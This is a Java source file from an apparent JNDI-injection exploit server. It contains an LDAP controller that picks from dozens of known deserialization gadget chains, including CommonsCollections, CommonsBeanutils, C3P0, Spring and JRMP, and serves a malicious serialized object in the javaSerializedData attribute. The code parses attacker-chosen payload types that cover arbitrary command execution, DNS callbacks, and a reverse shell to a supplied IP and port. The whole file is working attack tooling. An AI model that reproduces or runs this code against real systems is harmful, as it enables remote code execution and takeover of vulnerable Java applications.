package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.*;
import com.nu1r.jndi.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/deserialization"})
public class SerializedDataController implements LdapController {
    private GadgetType  gadgetType;
    private PayloadType payloadType;
    private String[]    params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));

        //这个方法里面有改动，其他基本无改动
        Entry  e     = new Entry(base);
        byte[] bytes = null;
        switch (gadgetType) {
            case urldns:
                bytes = URLDNS.getBytes(params[0]);
                break;
            case commonsbeanutils1:
                CommonsBeanutils1 commonsBeanutils1 = new CommonsBeanutils1();
                bytes = commonsBeanutils1.getBytes(payloadType, params);
                break;
            case commonsbeanutils2:
                CommonsBeanutils2 commonsBeanutils2 = new CommonsBeanutils2();
                bytes = commonsBeanutils2.getBytes(payloadType, params);
                break;
            case commonsbeanutils3:
                CommonsBeanutils3 commonsBeanutils3 = new CommonsBeanutils3();
                bytes = commonsBeanutils3.getBytes(payloadType, params);
                break;
            case commonsbeanutils4:
                CommonsBeanutils4 commonsBeanutils4 = new CommonsBeanutils4();
                bytes = commonsBeanutils4.getBytes(payloadType, params);
                break;
            case commonsbeanutils2nocc:
                CommonsBeanutils2NOCC commonsBeanutils2NOCC = new CommonsBeanutils2NOCC();
                bytes = commonsBeanutils2NOCC.getBytes(payloadType, params);
                break;
            case commonsbeanutils3183:
                CommonsBeanutils3183 commonsBeanutils3183 = new CommonsBeanutils3183();
                bytes = commonsBeanutils3183.getBytes(payloadType, params);
                break;
            case commonsbeanutils1183nocc:
                CommonsBeanutils1183NOCC commonsBeanutils1183NOCC = new CommonsBeanutils1183NOCC();
                bytes = commonsBeanutils1183NOCC.getBytes(payloadType, params);
                break;
            case commonscollections1:
                CommonsCollections1 commonsCollections1 = new CommonsCollections1();
                bytes = commonsCollections1.getBytes(payloadType, params);
                break;
            case commonscollections2:
                CommonsCollections2 commonsCollections2 = new CommonsCollections2();
                bytes = commonsCollections2.getBytes(payloadType, params);
                break;
            case commonscollections3:
                CommonsCollections3 commonsCollections3 = new CommonsCollections3();
                bytes = commonsCollections3.getBytes(payloadType, params);
                break;
            case commonscollections4:
                CommonsCollections4 commonsCollections4 = new CommonsCollections4();
                bytes = commonsCollections4.getBytes(payloadType, params);
                break;
            case commonscollections5:
                CommonsCollections5 commonsCollections5 = new CommonsCollections5();
                bytes = commonsCollections5.getBytes(payloadType, params);
                break;
            case commonscollections6:
                CommonsCollections6 cc6 = new CommonsCollections6();
                bytes = cc6.getBytes(payloadType, params);
                break;
            case commonscollections7:
                CommonsCollections7 commonsCollections7 = new CommonsCollections7();
                bytes = commonsCollections7.getBytes(payloadType, params);
                break;
            case commonscollections7lite_4:
                CommonsCollections7Lite CommonsCollections7Lite = new CommonsCollections7Lite();
                bytes = CommonsCollections7Lite.getBytes(payloadType, params);
                break;
            case commonscollections8:
                CommonsCollections8 cc8 = new CommonsCollections8();
                bytes = cc8.getBytes(payloadType, params);
                break;
            case commonscollections9:
                CommonsCollections9 cc9 = new CommonsCollections9();
                bytes = cc9.getBytes(payloadType, params);
                break;
            case commonscollections10:
                CommonsCollections10 cc10 = new CommonsCollections10();
                bytes = cc10.getBytes(payloadType, params);
                break;
            case commonscollectionsk1:
                CommonsCollectionsK1 ccK1 = new CommonsCollectionsK1();
                bytes = ccK1.getBytes(payloadType, params);
                break;
            case commonscollectionsk2:
                CommonsCollectionsK2 ccK2 = new CommonsCollectionsK2();
                bytes = ccK2.getBytes(payloadType, params);
                break;
            case commonscollections6lite:
                CommonsCollections6Lite CC6Lite = new CommonsCollections6Lite();
                bytes = CC6Lite.getBytes(payloadType, params);
                break;
            case commonscollections6lite_4:
                CommonsCollections6Lite_4 commonsCollections6Lite_4 = new CommonsCollections6Lite_4();
                bytes = commonsCollections6Lite_4.getBytes(payloadType, params);
                break;
            case jdk7u21:
                Jdk7u21 Jdk7u21 = new Jdk7u21();
                bytes = Jdk7u21.getBytes(payloadType, params);
                break;
            case jre8u20:
                Jre8u20 Jre8u20 = new Jre8u20();
                bytes = Jre8u20.getBytes(payloadType, params);
                break;
            case c3p0:
                C3P0 c3P0 = new C3P0();
                bytes = c3P0.getBytes(payloadType, params);
                break;
            case c3p02:
                C3P02 c3P02 = new C3P02();
                bytes = c3P02.getBytes(payloadType, params);
                break;
            case c3p03:
                C3P03 c3P03 = new C3P03();
                bytes = c3P03.getBytes(payloadType, params);
                break;
            case c3p04:
                C3P04 c3P04 = new C3P04();
                bytes = c3P04.getBytes(payloadType, params);
                break;
            case signedobject:
                SignedObject signedObject = new SignedObject();
                bytes = signedObject.getBytes(payloadType, params);
                break;
            case aspectjweaver:
                AspectJWeaver aspectJWeaver = new AspectJWeaver();
                bytes = aspectJWeaver.getBytes(payloadType, params);
                break;
            case beanshell1:
                BeanShell1 beanShell1 = new BeanShell1();
                bytes = beanShell1.getBytes(payloadType, params);
                break;
            case c3p092:
                C3P092 c3P092 = new C3P092();
                bytes = c3P092.getBytes(payloadType, params);
                break;
            case click1:
                Click1 click1 = new Click1();
                bytes = click1.getBytes(payloadType, params);
                break;
            case clojure:
                Clojure clojure = new Clojure();
                bytes = clojure.getBytes(payloadType, params);
                break;
            case jython1:
                Jython1 Jython1 = new Jython1();
                bytes = Jython1.getBytes(payloadType, params);
                break;
            case json:
                JSON1 JSON1 = new JSON1();
                bytes = JSON1.getBytes(payloadType, params);
                break;
            case groovy1:
                Groovy1 Groovy1 = new Groovy1();
                bytes = Groovy1.getBytes(payloadType, params);
                break;
            case hibernate1:
                Hibernate1 Hibernate1 = new Hibernate1();
                bytes = Hibernate1.getBytes(payloadType, params);
                break;
            case hibernate2:
                Hibernate2 Hibernate2 = new Hibernate2();
                bytes = Hibernate2.getBytes(payloadType, params);
                break;
            case javassistweld1:
                JavassistWeld1 JavassistWeld1 = new JavassistWeld1();
                bytes = JavassistWeld1.getBytes(payloadType, params);
                break;
            case jbossinterceptors1:
                JBossInterceptors1 JBossInterceptors1 = new JBossInterceptors1();
                bytes = JBossInterceptors1.getBytes(payloadType, params);
                break;
            case jdk7u21variant:
                Jdk7u21variant Jdk7u21variant = new Jdk7u21variant();
                bytes = Jdk7u21variant.getBytes(payloadType, params);
                break;
            case jrmpclient:
                JRMPClient JRMPClient = new JRMPClient();
                bytes = JRMPClient.getBytes(payloadType, params);
                break;
            case jrmpclient_activator:
                JRMPClient_Activator JRMPClient_Activator = new JRMPClient_Activator();
                bytes = JRMPClient_Activator.getBytes(payloadType, params);
                break;
            case jrmpclient_obj:
                JRMPClient_Obj JRMPClient_Obj = new JRMPClient_Obj();
                bytes = JRMPClient_Obj.getBytes(payloadType, params);
                break;
            case jrmplistener:
                JRMPListener JRMPListener = new JRMPListener();
                bytes = JRMPListener.getBytes(payloadType, params);
                break;
            case mozillarhino1:
                MozillaRhino1 MozillaRhino1 = new MozillaRhino1();
                bytes = MozillaRhino1.getBytes(payloadType, params);
                break;
            case mozillarhino2:
                MozillaRhino2 MozillaRhino2 = new MozillaRhino2();
                bytes = MozillaRhino2.getBytes(payloadType, params);
                break;
            case myfaces1:
                Myfaces1 Myfaces1 = new Myfaces1();
                bytes = Myfaces1.getBytes(payloadType, params);
                break;
            case myfaces2:
                Myfaces2 Myfaces2 = new Myfaces2();
                bytes = Myfaces2.getBytes(payloadType, params);
                break;
            case renderedimage:
                RenderedImage RenderedImage = new RenderedImage();
                bytes = RenderedImage.getBytes(payloadType, params);
                break;
            case rome:
                ROME ROME = new ROME();
                bytes = ROME.getBytes(payloadType, params);
                break;
            case rome2:
                ROME2 ROME2 = new ROME2();
                bytes = ROME2.getBytes(payloadType, params);
                break;
            case spring1:
                Spring1 Spring1 = new Spring1();
                bytes = Spring1.getBytes(payloadType, params);
                break;
            case spring2:
                Spring2 Spring2 = new Spring2();
                bytes = Spring2.getBytes(payloadType, params);
                break;
            case spring3:
                Spring3 Spring3 = new Spring3();
                bytes = Spring3.getBytes(payloadType, params);
                break;
            case vaadin1:
                Vaadin1 Vaadin1 = new Vaadin1();
                bytes = Vaadin1.getBytes(payloadType, params);
                break;
        }

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", bytes);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try {
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try {
                gadgetType = GadgetType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                System.out.println("[+] GaddgetType >> " + gadgetType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            if (gadgetType == GadgetType.urldns) {
                String url = "http://" + base.substring(base.lastIndexOf("/") + 1);
                System.out.println("[+] URL >> " + url);
                params = new String[]{url};
                return;
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex < 0) thirdIndex = base.length();
            try {
                payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                System.out.println("[+] PayloadType >> " + payloadType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            switch (payloadType) {
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println("[+] URL >> " + url);
                    params = new String[]{url};
                    break;
                case command:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println("[+] Command >> " + cmd);
                    params = new String[]{cmd};
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println("[+] IP >> " + results[0]);
                    System.out.println("[+] Port >> " + results[1]);
                    params = results;
                    break;
            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
